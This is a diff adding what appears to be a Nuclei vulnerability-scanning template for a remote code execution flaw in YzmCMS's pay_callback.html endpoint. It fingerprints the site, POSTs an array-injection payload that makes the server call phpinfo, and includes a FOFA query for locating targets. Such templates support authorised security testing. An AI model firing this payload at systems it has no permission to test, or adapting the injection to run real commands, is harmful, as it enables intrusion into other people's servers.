@@ -1,0 +1,41 @@
+id: yzmcms-pay-callback-html-rce
+info:
+  name: YzmCMS pay_callback.html Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    finger: yzmcms
+    fofa: app="yzmcms"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "YzmCMS内容管理系统"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/pay/index/pay_callback.html"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+          - "PHP API"
+          - "PHP Extension"
